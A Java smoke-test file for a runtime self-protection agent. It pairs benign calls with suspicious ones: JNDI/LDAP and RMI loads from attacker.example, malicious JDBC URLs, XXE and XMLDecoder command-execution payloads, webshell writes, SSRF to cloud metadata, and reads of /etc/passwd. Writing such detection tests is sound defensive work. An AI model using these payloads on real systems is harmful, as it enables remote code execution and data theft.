package io.ohmyrasp.agent.java17;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Reader;
import java.lang.management.ManagementFactory;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.server.RMIClassLoader;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import javax.xml.XMLConstants;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.management.StandardMBean;
import javax.naming.InitialContext;
import javax.security.auth.login.AppConfigurationEntry;
import javax.script.AbstractScriptEngine;
import javax.script.Bindings;
import javax.script.ScriptEngine;
import javax.script.ScriptContext;
import javax.script.SimpleBindings;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.tools.JavaCompiler;
import javax.tools.SimpleJavaFileObject;
import javax.tools.ToolProvider;
import org.xml.sax.InputSource;

public final class Java17CommandSmoke {
  private Java17CommandSmoke() {}

  public static void main(String[] args) throws Exception {
    String mode = args.length == 0 ? "suspicious" : args[0];
    if ("jndi-normal".equals(mode)) {
      try {
        new InitialContext().lookup("java:comp/env/jdbc/app");
      } catch (Exception ignored) {
        // The smoke target only verifies that the local JNDI lookup does not create a RASP event.
      }
      return;
    }
    if ("jndi-suspicious".equals(mode)) {
      System.setProperty("com.sun.jndi.ldap.connect.timeout", "200");
      System.setProperty("com.sun.jndi.ldap.read.timeout", "200");
      new InitialContext().lookup("ldap://127.0.0.1:1389/Exploit");
      return;
    }
    if ("deser-normal".equals(mode)) {
      deserialize(serialize("hello"));
      return;
    }
    if ("deser-suspicious".equals(mode)) {
      try {
        deserialize(serializedDescriptor("com.sun.rowset.JdbcRowSetImpl"));
      } catch (Exception expected) {
        // The crafted descriptor only needs to reach ObjectInputStream.resolveClass.
      }
      return;
    }
    if ("file-normal".equals(mode)) {
      File file = new File("/tmp/ohmyrasp-java17-safe.txt");
      FileOutputStream output = new FileOutputStream(file);
      output.write("safe".getBytes("UTF-8"));
      output.close();
      FileInputStream input = new FileInputStream(file);
      input.close();
      return;
    }
    if ("file-read-sensitive".equals(mode)) {
      FileInputStream input = new FileInputStream("/etc/passwd");
      input.close();
      return;
    }
    if ("file-write-script".equals(mode)) {
      File dir = new File("/tmp/webapps/ROOT");
      if (!dir.exists() && !dir.mkdirs()) {
        throw new IllegalStateException("could not create smoke webroot");
      }
      FileOutputStream output = new FileOutputStream(new File(dir, "shell.jsp"));
      output.write("<% out.println(\"ok\"); %>".getBytes("UTF-8"));
      output.close();
      return;
    }
    if ("url-normal".equals(mode)) {
      new URL("https://example.com/public/api").openConnection();
      return;
    }
    if ("url-metadata".equals(mode)) {
      new URL("http://169.254.169.254/latest/meta-data/").openConnection();
      return;
    }
    if ("archive-normal".equals(mode)) {
      ZipEntry entry = new ZipEntry("safe/report.txt");
      entry.getName();
      FileOutputStream output = new FileOutputStream("/tmp/archive-report.txt");
      output.write("safe".getBytes("UTF-8"));
      output.close();
      return;
    }
    if ("archive-traversal".equals(mode)) {
      ZipEntry entry = new ZipEntry("../../webapps/ROOT/shell.jsp");
      entry.getName();
      FileOutputStream output = new FileOutputStream("/tmp/archive-shell.jsp");
      output.write("blocked".getBytes("UTF-8"));
      output.close();
      return;
    }
    if ("jdbc-normal".equals(mode)) {
      try {
        DriverManager.getConnection("jdbc:unknown:normal");
      } catch (SQLException ignored) {
        // The smoke target only verifies that a normal JDBC URL does not create a RASP event.
      }
      return;
    }
    if ("jdbc-h2-suspicious".equals(mode)) {
      DriverManager.getConnection("jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1/poc.sql'");
      return;
    }
    if ("jdbc-derby-suspicious".equals(mode)) {
      DriverManager.getConnection(
          "jdbc:derby:memory:test;create=true;init=CALL SQLJ.INSTALL_JAR('http://127.0.0.1/payload.jar','APP.PAYLOAD',0)");
      return;
    }
    if ("jdbc-mysql-suspicious".equals(mode)) {
      DriverManager.getConnection(
          "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor");
      return;
    }
    if ("classloader-normal".equals(mode)) {
      URLClassLoader loader =
          new URLClassLoader(new URL[] {new File("/tmp/ohmyrasp-java17-safe.jar").toURI().toURL()});
      loader.close();
      return;
    }
    if ("classloader-suspicious".equals(mode)) {
      URLClassLoader loader =
          new URLClassLoader(new URL[] {new URL("http://attacker.example/evil.jar")});
      loader.close();
      return;
    }
    if ("rmi-classloader-suspicious".equals(mode)) {
      RMIClassLoader.loadClass("http://attacker.example/Exploit", "example.RemoteExploit");
      return;
    }
    if ("script-normal".equals(mode)) {
      ScriptEngine engine = scriptEngine();
      if (engine != null) {
        engine.eval("1 + 1");
      }
      return;
    }
    if ("script-suspicious".equals(mode)) {
      ScriptEngine engine = scriptEngine();
      if (engine == null) {
        throw new IllegalStateException("JavaScript engine unavailable");
      }
      engine.eval("Java.type('java.lang.Runtime').getRuntime().exec('id')");
      return;
    }
    if ("compile-normal".equals(mode)) {
      compile("SafeCompile", "public class SafeCompile { int value() { return 1 + 1; } }");
      return;
    }
    if ("compile-suspicious".equals(mode)) {
      compile(
          "EvilCompile",
          "public class EvilCompile { void run() throws Exception { java.lang.Runtime.getRuntime().exec(\"id\"); } }");
      return;
    }
    if ("jaas-normal".equals(mode)) {
      Map<String, String> options = new HashMap<String, String>();
      options.put("principal", "app/localhost@EXAMPLE.COM");
      new AppConfigurationEntry(
          "com.sun.security.auth.module.Krb5LoginModule",
          AppConfigurationEntry.LoginModuleControlFlag.REQUIRED,
          options);
      return;
    }
    if ("jaas-suspicious".equals(mode)) {
      Map<String, String> options = new HashMap<String, String>();
      options.put("user.provider.url", "ldap://java-chains:50389/x");
      options.put("useFirstPass", "true");
      new AppConfigurationEntry(
          "com.sun.security.auth.module.JndiLoginModule",
          AppConfigurationEntry.LoginModuleControlFlag.REQUIRED,
          options);
      return;
    }
    if ("jmx-normal".equals(mode)) {
      invokeJmx("echo", new Object[] {"hello"}, new String[] {String.class.getName()});
      return;
    }
    if ("jmx-remote-config".equals(mode)) {
      invokeJmx(
          "addNetworkConnector",
          new Object[] {"static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"},
          new String[] {String.class.getName()});
      return;
    }
    if ("jmx-file-write".equals(mode)) {
      invokeJmx(
          "copyTo",
          new Object[] {"/opt/activemq/webapps/admin/shelljfr.jsp"},
          new String[] {String.class.getName()});
      return;
    }
    if ("xml-decoder-normal".equals(mode)) {
      decodeXml(xmlDecoderSafePayload());
      return;
    }
    if ("xml-decoder-runtime".equals(mode)) {
      decodeXml(xmlDecoderRuntimePayload());
      return;
    }
    if ("xml-decoder-webshell".equals(mode)) {
      decodeXml(xmlDecoderWebshellPayload());
      return;
    }
    if ("xxe-normal".equals(mode)) {
      parseXml("<root>safe</root>");
      return;
    }
    if ("xxe-file".equals(mode)) {
      parseXml(xxePayload("file:///etc/passwd"));
      return;
    }
    if ("xxe-http".equals(mode)) {
      parseXml(xxePayload("http://127.0.0.1:9/evil.dtd"));
      return;
    }
    Process process;
    if ("normal".equals(mode)) {
      process = new ProcessBuilder("/bin/true").start();
    } else {
      process = new ProcessBuilder("sh", "-c", "cat /etc/passwd").start();
    }
    process.waitFor();
  }

  private static byte[] serialize(Object value) throws Exception {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    ObjectOutputStream output = new ObjectOutputStream(bytes);
    output.writeObject(value);
    output.close();
    return bytes.toByteArray();
  }

  private static Object deserialize(byte[] bytes) throws Exception {
    ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(bytes));
    try {
      return input.readObject();
    } finally {
      input.close();
    }
  }

  private static byte[] serializedDescriptor(String className) throws Exception {
    ByteArrayOutputStream output = new ByteArrayOutputStream();
    DataOutputStream stream = new DataOutputStream(output);
    stream.writeShort(0xaced);
    stream.writeShort(5);
    stream.writeByte(0x73);
    stream.writeByte(0x72);
    stream.writeUTF(className);
    stream.writeLong(1L);
    stream.writeByte(2);
    stream.writeShort(0);
    stream.writeByte(0x78);
    stream.writeByte(0x70);
    stream.close();
    return output.toByteArray();
  }

  private static Object decodeXml(String payload) throws Exception {
    XMLDecoder decoder =
        new XMLDecoder(new ByteArrayInputStream(payload.getBytes("UTF-8")));
    Object value = decoder.readObject();
    decoder.close();
    return value;
  }

  private static String parseXml(String xml) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setExpandEntityReferences(true);
    factory.setXIncludeAware(false);
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", true);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "all");
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "all");
    return factory
        .newDocumentBuilder()
        .parse(new InputSource(new ByteArrayInputStream(xml.getBytes("UTF-8"))))
        .getDocumentElement()
        .getTextContent();
  }

  private static ScriptEngine scriptEngine() {
    return new LocalScriptEngineImpl();
  }

  private static void compile(String className, String source) {
    JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
    if (compiler == null) {
      throw new IllegalStateException("Java compiler unavailable");
    }
    JavaCompiler.CompilationTask task =
        compiler.getTask(
            null,
            null,
            null,
            Arrays.asList("-d", "/tmp"),
            null,
            Arrays.asList(new StringJavaSource(className, source)));
    task.call();
  }

  private static void invokeJmx(String operation, Object[] arguments, String[] signatures)
      throws Exception {
    MBeanServer server = ManagementFactory.getPlatformMBeanServer();
    ObjectName name = new ObjectName("ohmyrasp.java17:type=SmokeBroker,name=n" + System.nanoTime());
    StandardMBean mbean = new StandardMBean(new SmokeBroker(), SmokeBrokerMBean.class);
    server.registerMBean(mbean, name);
    try {
      server.invoke(name, operation, arguments, signatures);
    } finally {
      if (server.isRegistered(name)) {
        server.unregisterMBean(name);
      }
    }
  }

  public interface SmokeBrokerMBean {
    String echo(String value);

    String addNetworkConnector(String value);

    String copyTo(String path);
  }

  public static final class SmokeBroker implements SmokeBrokerMBean {
    @Override
    public String echo(String value) {
      return value;
    }

    @Override
    public String addNetworkConnector(String value) {
      return value;
    }

    @Override
    public String copyTo(String path) {
      return path;
    }
  }

  private static String xmlDecoderSafePayload() {
    return "<java version=\"17.0\" class=\"java.beans.XMLDecoder\">"
        + "<string>safe</string>"
        + "</java>";
  }

  private static String xmlDecoderRuntimePayload() {
    return "<java version=\"17.0\" class=\"java.beans.XMLDecoder\">"
        + "<void class=\"java.lang.ProcessBuilder\">"
        + "<array class=\"java.lang.String\" length=\"3\">"
        + "<void index=\"0\"><string>sh</string></void>"
        + "<void index=\"1\"><string>-c</string></void>"
        + "<void index=\"2\"><string>id</string></void>"
        + "</array>"
        + "<void method=\"start\"/>"
        + "</void>"
        + "</java>";
  }

  private static String xmlDecoderWebshellPayload() {
    return "<java version=\"17.0\" class=\"java.beans.XMLDecoder\">"
        + "<object class=\"java.io.PrintWriter\">"
        + "<string>/tmp/webapps/ROOT/shell.jsp</string>"
        + "</object>"
        + "</java>";
  }

  private static String xxePayload(String entity) {
    return "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"" + entity + "\">]><root>&xxe;</root>";
  }

  private static final class StringJavaSource extends SimpleJavaFileObject {
    private final String source;

    StringJavaSource(String className, String source) {
      super(URI.create("string:///" + className + ".java"), Kind.SOURCE);
      this.source = source;
    }

    @Override
    public CharSequence getCharContent(boolean ignoreEncodingErrors) {
      return source;
    }
  }

  private static final class LocalScriptEngineImpl extends AbstractScriptEngine {
    @Override
    public Object eval(String script, ScriptContext context) {
      return script;
    }

    @Override
    public Object eval(Reader reader, ScriptContext context) {
      return null;
    }

    @Override
    public Bindings createBindings() {
      return new SimpleBindings();
    }

    @Override
    public javax.script.ScriptEngineFactory getFactory() {
      return null;
    }
  }
}
